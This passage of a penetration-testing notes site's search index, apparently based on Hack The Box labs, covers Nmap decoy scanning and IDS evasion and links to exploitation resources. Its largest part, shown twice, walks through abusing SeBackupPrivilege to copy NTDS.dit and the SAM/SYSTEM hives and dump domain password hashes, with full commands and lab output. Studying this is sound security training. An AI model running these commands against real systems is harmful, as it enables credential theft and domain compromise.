--max-rtt-timeout 100ms Sets the specified time value as maximum RTT timeout. --min-rate 300 Sets the number of packets that will be sent simultaneously. -T <0-5> Specifies the specific timing template.","title":"Performance Options"},{"location":"tools/nmap/#detect-idsips","text":"Unlike firewalls and their rules, the detection of IDS/IPS systems is much more difficult because these are passive traffic monitoring systems. IDS systems examine all connections between hosts. If the IDS finds packets containing the defined contents or specifications, the administrator is notified and takes appropriate action in the worst case. IDS systems alone are usually there to help administrators detect potential attacks on their network. They can then decide how to handle such connections. We can trigger certain security measures from an administrator, for example, by aggressively scanning a single port and its service. Based on whether specific security measures are taken, we can detect if the network has some monitoring applications or not. One method to determine whether such IPS system is present in the target network is to scan from a single host ( VPS ). If at any time this host is blocked and has no access to the target network, we know that the administrator has taken some security measures. Accordingly, we can continue our penetration test with another VPS . Consequently, we know that we need to be quieter with our scans and, in the best case, disguise all interactions with the target network and its services.","title":"Detect IDS/IPS"},{"location":"tools/nmap/#decoys","text":"There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method ( -D ) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random ( RND ) a specific number (for example: 5 ) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. hrmns@htb[/htb]$ sudo nmap 10 .129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CEST SENT (0.0378s) TCP 102.52.161.59:59289 > 10.129.2.28:80 S ttl=42 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0378s) TCP 10.10.14.2:59289 > 10.129.2.28:80 S ttl=59 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0379s) TCP 210.120.38.29:59289 > 10.129.2.28:80 S ttl=37 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0379s) TCP 191.6.64.171:59289 > 10.129.2.28:80 S ttl=38 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0379s) TCP 184.178.194.209:59289 > 10.129.2.28:80 S ttl=39 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> SENT (0.0379s) TCP 43.21.121.33:59289 > 10.129.2.28:80 S ttl=55 id=29822 iplen=44 seq=3687542010 win=1024 <mss 1460> RCVD (0.1370s) TCP 10.129.2.28:80 > 10.10.14.2:59289 SA ttl=64 id=0 iplen=44 seq=4056111701 win=64240 <mss 1460> Nmap scan report for 10.129.2.28 Host is up (0.099s latency). PORT STATE SERVICE 80/tcp open http MAC Address: DE:AD:00:00:BE:EF (Intel Corporate) Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds","title":"Decoys"},{"location":"useful_resources/links/","text":"Very unstructered, I will organize this later. Vulnerabilities DBs Exploit-db nvd.nist.gov/vuln cve.mitre Hashes Hash-Analyzer Hash-Identifier Priv Esc PayloadAllTheThings ( Linux , Windows ) hacktricks ( Linux , Windows ) LinEnum linuxprivchecker Enumeration Scripts PEASS Windows: Seatbelt JAWS Escalate User Priveleges GTFOBINS Vulnerable Machines/Applications There are many resources available to practice common web and network vulnerabilities in a safe, controlled setting. The following are some examples of purposefully vulnerable web applications and vulnerable machines that we can set up in a lab environment for extra practice. OWASP Juice Shop Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire OWASP Top Ten along with many other real-world application security flaws. Metasploitable 2 Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation. Metasploitable 3 Is a template for building a vulnerable Windows VM configured with a wide range of vulnerabilities . DVWA This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty. TMUX https://github.com/tmux-plugins Binary Exploitation \u00b6 Binary Exploitation https://ir0nstone.gitbook.io/notes/ https://www.legacyy.xyz/ Heap https://ir0nstone.gitbook.io/notes/types/heap/introduction-to-the-heap https://youtu.be/HPDBOhiKaD8 https://www.0x0ff.info/2014/heap-based-buffer-overflow/ https://youtu.be/woKGxIrKFBc https://devel0pment.de/?p=688 https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/ https://courseupload.com/linux-heap-exploitation-200321/ https://heap-exploitation.dhavalkapil.com/ http://blog.fxiao.me/how-to-heap/ https://youtu.be/nnF4Avttbns https://youtu.be/A-Qf_Q_AeFw https://www.youtube.com/watch?v=PFqEKkj7wWs Buffer Overlow https://www.youtube.com/watch?v=Do1Ri8TCF0Q https://www.youtube.com/watch?v=o3v8gEfdaQY Kernel exploitation https://github.com/xairy/linux-kernel-exploitation/blob/master/README.md https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html https://github.com/pr0cf5/kernel-exploit-practice/tree/master/bypass-smep https://arjunsreedharan.org/post/82710718100/kernel-101-lets-write-a-kernel https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/ https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/ https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-2/ Browser exploit https://youtube.com/playlist?list=PLhixgUqwRTjwufDsT1ntgOY9yjZgg5H_t https://blog.ret2.io/2018/06/05/pwn2own-2018-exploit-development/ https://github.com/Escapingbug/awesome-browser-exploit https://youtu.be/3szZpS58Dqg https://github.com/Geluchat/chrome_v8_exploit Windows \u00b6 https://github.com/alphaSeclab/windows-security/blob/master/Readme_en.md Active Directory https://book.hacktricks.xyz/windows/active-directory-methodology https://zer1t0.gitlab.io/posts/attacking_ad/ https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/ https://www.tarlogic.com/en/blog/how-kerberos-works/ https://www.tarlogic.com/en/blog/how-to-attack-kerberos/ https://book.hacktricks.xyz/windows/active-directory-methodology https://zer1t0.gitlab.io/posts/attacking_ad/ + https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html https://www.silicon.fr/zerologon-faille-critique-active-directory-346780.html https://github.com/GhostPack/Certify https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab https://github.com/tiyeuse/Active-Directory-Cheatsheet/ https://hideandsec.sh/books/cheatsheets-82c/page/active-directory https://github.com/fuzz-security/Active-Directory-Exploitation-Cheat-Sheet https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/ https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/ https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/ http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/ http://theredwindows.net/index.php/2021/02/12/exploitation-dacl-en-active-directory/ https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/ https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html","title":"Useful Links"},{"location":"useful_resources/links/#binary-exploitation","text":"Binary Exploitation https://ir0nstone.gitbook.io/notes/ https://www.legacyy.xyz/ Heap https://ir0nstone.gitbook.io/notes/types/heap/introduction-to-the-heap https://youtu.be/HPDBOhiKaD8 https://www.0x0ff.info/2014/heap-based-buffer-overflow/ https://youtu.be/woKGxIrKFBc https://devel0pment.de/?p=688 https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/ https://courseupload.com/linux-heap-exploitation-200321/ https://heap-exploitation.dhavalkapil.com/ http://blog.fxiao.me/how-to-heap/ https://youtu.be/nnF4Avttbns https://youtu.be/A-Qf_Q_AeFw https://www.youtube.com/watch?v=PFqEKkj7wWs Buffer Overlow https://www.youtube.com/watch?v=Do1Ri8TCF0Q https://www.youtube.com/watch?v=o3v8gEfdaQY Kernel exploitation https://github.com/xairy/linux-kernel-exploitation/blob/master/README.md https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html https://github.com/pr0cf5/kernel-exploit-practice/tree/master/bypass-smep https://arjunsreedharan.org/post/82710718100/kernel-101-lets-write-a-kernel https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/ https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/ https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-2/ Browser exploit https://youtube.com/playlist?list=PLhixgUqwRTjwufDsT1ntgOY9yjZgg5H_t https://blog.ret2.io/2018/06/05/pwn2own-2018-exploit-development/ https://github.com/Escapingbug/awesome-browser-exploit https://youtu.be/3szZpS58Dqg https://github.com/Geluchat/chrome_v8_exploit","title":"Binary Exploitation"},{"location":"useful_resources/links/#windows","text":"https://github.com/alphaSeclab/windows-security/blob/master/Readme_en.md Active Directory https://book.hacktricks.xyz/windows/active-directory-methodology https://zer1t0.gitlab.io/posts/attacking_ad/ https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/ https://www.tarlogic.com/en/blog/how-kerberos-works/ https://www.tarlogic.com/en/blog/how-to-attack-kerberos/ https://book.hacktricks.xyz/windows/active-directory-methodology https://zer1t0.gitlab.io/posts/attacking_ad/ + https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html https://www.silicon.fr/zerologon-faille-critique-active-directory-346780.html https://github.com/GhostPack/Certify https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab https://github.com/tiyeuse/Active-Directory-Cheatsheet/ https://hideandsec.sh/books/cheatsheets-82c/page/active-directory https://github.com/fuzz-security/Active-Directory-Exploitation-Cheat-Sheet https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/ https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/ https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/ http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/ http://theredwindows.net/index.php/2021/02/12/exploitation-dacl-en-active-directory/ https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/ https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html","title":"Windows"},{"location":"windows_privesc/builtin_groups/","text":"Listing of all built-in Windows groups along with a detailed description of each Listing of privileged accounts and groups in Active Directory Backup Operators \u00b6 The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). We can use this PoC to exploit the SeBackupPrivilege , and copy this file. Importing Libraries PS C:\\htb> Import-Module .\\SeBackupPrivilegeUtils.dll PS C:\\htb> Import-Module .\\SeBackupPrivilegeCmdLets.dll Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege. PS C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled PS C:\\htb> Get-SeBackupPrivilege SeBackupPrivilege is disabled Enabling SeBackupPrivilege with PS C:\\htb> Set-SeBackupPrivilege PS C:\\htb> Get-SeBackupPrivilege SeBackupPrivilege is enabled PS C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Copying a Protected File PS C:\\htb> dir C:\\Confidential\\ Directory: C:\\Confidential Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 5/6/2021 1:01 PM 88 2021 Contract.txt PS C:\\htb> cat 'C:\\Confidential\\2021 Contract.txt' cat : Access to the path 'C:\\Confidential\\2021 Contract.txt' is denied. At line:1 char:1 + cat 'C:\\Confidential\\2021 Contract.txt' + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\Confidential\\2021 Contract.txt:String) [Get-Content], Unauthor izedAccessException + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand PS C:\\htb> Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt Copied 88 bytes PS C:\\htb> cat .\\Contract.txt Inlanefreight 2021 Contract ============================== Board of Directors: <...SNIP...> The commands above demonstrate how sensitive information was accessed without possessing the required permissions. Attacking a Domain Controller - Copying NTDS.dit \u00b6 This group also permits logging in locally to a domain controller. The active directory database NTDS.dit is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system. PS C:\\htb> diskshadow.exe Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC, 10/14/2020 12:57:52 AM DISKSHADOW> set verbose on DISKSHADOW> set metadata C:\\Windows\\Temp\\meta.cab DISKSHADOW> set context clientaccessible DISKSHADOW> set context persistent DISKSHADOW> begin backup DISKSHADOW> add volume C: alias cdrive DISKSHADOW> create DISKSHADOW> expose %cdrive% E: DISKSHADOW> end backup DISKSHADOW> exit PS C:\\htb> dir E: Directory: E:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/6/2021 1:00 PM Confidential d----- 9/15/2018 12:19 AM PerfLogs d-r--- 3/24/2021 6:20 PM Program Files d----- 9/15/2018 2:06 AM Program Files (x86) d----- 5/6/2021 1:05 PM Tools d-r--- 5/6/2021 12:51 PM Users d----- 3/24/2021 6:38 PM Windows Next, we can use the Copy-FileSeBackupPrivilege cmdlet to bypass the ACL and copy the NTDS.dit locally. PS C:\\htb> Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit Copied 16777216 bytes The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py C:\\htb> reg save HKLM\\SYSTEM SYSTEM.SAV The operation completed successfully. C:\\htb> reg save HKLM\\SAM SAM.SAV The operation completed successfully. If a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the FILE_FLAG_BACKUP_SEMANTICS flag is specified. With the NTDS.dit extracted, we can use a tool such as secretsdump.py or the PowerShell DSInternals module to extract all Active Directory account credentials. PS C:\\htb> Import-Module .\\DSInternals.psd1 PS C:\\htb> $key = Get-BootKey -SystemHivePath .\\SYSTEM PS C:\\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\\ntds.dit -BootKey $key DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL Sid: S-1-5-21-669053619-2741956077-1013132368-500 Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215 SamAccountName: Administrator SamAccountType: User UserPrincipalName: PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl: NormalAccount, PasswordNeverExpires AdminCount: True Deleted: False LastLogonDate: 5/6/2021 5:40:30 PM DisplayName: GivenName: Surname: Description: Built-in account for administering the computer/domain ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-669053619-2741956077-1013132368-512 Secrets NTHash: cf3a5525ee9414229e66279623ed5c58 LMHash: NTHashHistory: LMHashHistory: SupplementalCredentials: ClearText: NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7 Kerberos: Credentials: DES_CBC_MD5 Key: d60dfbbf20548938 OldCredentials: Salt: WIN-NB4NGP3TKNKAdministrator Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: 94c300d0e47775b407f2496a5cca1a0a Iterations: 4096 DES_CBC_MD5 Key: d60dfbbf20548938 Iterations: 4096 OldCredentials: OlderCredentials: ServiceCredentials: Salt: WIN-NB4NGP3TKNKAdministrator DefaultIterationCount: 4096 Flags: 0 WDigest: Key Credentials: Credential Roaming Created: Modified: Credentials: We can also use SecretsDump offline to extract hashes from the ntds.dit file. These can then be used for pass-the-hash to access additional resources or cracked offline using Hashcat to gain further access. hrmns@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330 [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129::: htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5::: svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: <SNIP> The built-in utility robocopy can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the copy command in that instead of just copying all files. It can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran. C:\\htb> robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit ------------------------------------------------------------------------------- ROBOCOPY :: Robust File Copy for Windows ------------------------------------------------------------------------------- Started : Thursday, May 6, 2021 1:11:47 PM Source : E:\\Windows\\NTDS\\ Dest : C:\\Tools\\ntds\\ Files : ntds.dit Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30 ------------------------------------------------------------------------------ New Dir 1 E:\\Windows\\NTDS\\ 100% New File 16.0 m ntds.dit ------------------------------------------------------------------------------ Total Copied Skipped Mismatch FAILED Extras Dirs : 1 1 0 0 0 0 Files : 1 1 0 0 0 0 Bytes : 16.00 m 16.00 m 0 0 0 0 Times : 0:00:00 0:00:00 0:00:00 0:00:00 Speed : 356962042 Bytes/sec. Speed : 20425.531 MegaBytes/min. Ended : Thursday, May 6, 2021 1:11:47 PM This eliminates the need for any external tools.","title":"Windows Built-in Groups"},{"location":"windows_privesc/builtin_groups/#backup-operators","text":"The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). We can use this PoC to exploit the SeBackupPrivilege , and copy this file. Importing Libraries PS C:\\htb> Import-Module .\\SeBackupPrivilegeUtils.dll PS C:\\htb> Import-Module .\\SeBackupPrivilegeCmdLets.dll Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege. PS C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled PS C:\\htb> Get-SeBackupPrivilege SeBackupPrivilege is disabled Enabling SeBackupPrivilege with PS C:\\htb> Set-SeBackupPrivilege PS C:\\htb> Get-SeBackupPrivilege SeBackupPrivilege is enabled PS C:\\htb> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Copying a Protected File PS C:\\htb> dir C:\\Confidential\\ Directory: C:\\Confidential Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 5/6/2021 1:01 PM 88 2021 Contract.txt PS C:\\htb> cat 'C:\\Confidential\\2021 Contract.txt' cat : Access to the path 'C:\\Confidential\\2021 Contract.txt' is denied. At line:1 char:1 + cat 'C:\\Confidential\\2021 Contract.txt' + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (C:\\Confidential\\2021 Contract.txt:String) [Get-Content], Unauthor izedAccessException + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand PS C:\\htb> Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt Copied 88 bytes PS C:\\htb> cat .\\Contract.txt Inlanefreight 2021 Contract ============================== Board of Directors: <...SNIP...> The commands above demonstrate how sensitive information was accessed without possessing the required permissions.","title":"Backup Operators"},{"location":"windows_privesc/builtin_groups/#attacking-a-domain-controller-copying-ntdsdit","text":"This group also permits logging in locally to a domain controller. The active directory database NTDS.dit is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. As the NTDS.dit file is locked by default, we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive. The NTDS.dit in this shadow copy won't be in use by the system. PS C:\\htb> diskshadow.exe Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC, 10/14/2020 12:57:52 AM DISKSHADOW> set verbose on DISKSHADOW> set metadata C:\\Windows\\Temp\\meta.cab DISKSHADOW> set context clientaccessible DISKSHADOW> set context persistent DISKSHADOW> begin backup DISKSHADOW> add volume C: alias cdrive DISKSHADOW> create DISKSHADOW> expose %cdrive% E: DISKSHADOW> end backup DISKSHADOW> exit PS C:\\htb> dir E: Directory: E:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/6/2021 1:00 PM Confidential d----- 9/15/2018 12:19 AM PerfLogs d-r--- 3/24/2021 6:20 PM Program Files d----- 9/15/2018 2:06 AM Program Files (x86) d----- 5/6/2021 1:05 PM Tools d-r--- 5/6/2021 12:51 PM Users d----- 3/24/2021 6:38 PM Windows Next, we can use the Copy-FileSeBackupPrivilege cmdlet to bypass the ACL and copy the NTDS.dit locally. PS C:\\htb> Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit Copied 16777216 bytes The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's secretsdump.py C:\\htb> reg save HKLM\\SYSTEM SYSTEM.SAV The operation completed successfully. C:\\htb> reg save HKLM\\SAM SAM.SAV The operation completed successfully. If a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the FILE_FLAG_BACKUP_SEMANTICS flag is specified. With the NTDS.dit extracted, we can use a tool such as secretsdump.py or the PowerShell DSInternals module to extract all Active Directory account credentials. PS C:\\htb> Import-Module .\\DSInternals.psd1 PS C:\\htb> $key = Get-BootKey -SystemHivePath .\\SYSTEM PS C:\\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\\ntds.dit -BootKey $key DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL Sid: S-1-5-21-669053619-2741956077-1013132368-500 Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215 SamAccountName: Administrator SamAccountType: User UserPrincipalName: PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl: NormalAccount, PasswordNeverExpires AdminCount: True Deleted: False LastLogonDate: 5/6/2021 5:40:30 PM DisplayName: GivenName: Surname: Description: Built-in account for administering the computer/domain ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-669053619-2741956077-1013132368-512 Secrets NTHash: cf3a5525ee9414229e66279623ed5c58 LMHash: NTHashHistory: LMHashHistory: SupplementalCredentials: ClearText: NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7 Kerberos: Credentials: DES_CBC_MD5 Key: d60dfbbf20548938 OldCredentials: Salt: WIN-NB4NGP3TKNKAdministrator Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: 94c300d0e47775b407f2496a5cca1a0a Iterations: 4096 DES_CBC_MD5 Key: d60dfbbf20548938 Iterations: 4096 OldCredentials: OlderCredentials: ServiceCredentials: Salt: WIN-NB4NGP3TKNKAdministrator DefaultIterationCount: 4096 Flags: 0 WDigest: Key Credentials: Credential Roaming Created: Modified: Credentials: We can also use SecretsDump offline to extract hashes from the ntds.dit file. These can then be used for pass-the-hash to access additional resources or cracked offline using Hashcat to gain further access. hrmns@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330 [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129::: htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5::: svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: <SNIP> The built-in utility robocopy can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the copy command in that instead of just copying all files. It can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran. C:\\htb> robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit ------------------------------------------------------------------------------- ROBOCOPY :: Robust File Copy for Windows ------------------------------------------------------------------------------- Started : Thursday, May 6, 2021 1:11:47 PM Source : E:\\Windows\\NTDS\\ Dest : C:\\Tools\\ntds\\ Files : ntds.dit Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30 ------------------------------------------------------------------------------ New Dir 1 E:\\Windows\\NTDS\\ 100% New File 16.0 m ntds.dit ------------------------------------------------------------------------------ Total Copied Skipped Mismatch FAILED Extras Dirs : 1 1 0 0 0 0 Files : 1 1 0 0 0 0 Bytes : 16.00 m 16.00 m 0 0 0 0 Times : 0:00:00 0:00:00 0:00:00 0:00:00 Speed : 356962042 Bytes/sec. Speed : 20425.531 MegaBytes/min. Ended : Thursday, May 6, 2021 1:11:47 PM This eliminates the need for any external tools.","title":"Attacking a Domain Controller - Copying NTDS.dit"},{"location":"windows_privesc/comm_with_ps/","text":"Enumerating Network Services \u00b6 Most common way to interact with processes is through a network socket (DNS, HTTP, SMB, etc.). Display Active Network Connections C:\\htb> netstat -ano The main thing to look for with Active Network Connections are entries listening on loopback addresses ( 127.0.0.1 and ::1 ) that are not listening on the IP Address (10.x.x.x) or broadcast (0.0.0.0, ::/0). The reason for this is network sockets on localhost are often insecure due to the thought that \"they aren't accessible to the network.\" Named Pipes \u00b6 Listing Named Pipes with Pipelist C:\\htb> pipelist.exe /accepteula PowerShell to list named pipes using gci ( Get-ChildItem ). PS C:\\htb> gci \\\\.\\pipe\\ Reviewing LSASS Named Pipe Permissions C:\\htb> accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v","title":"Communication with 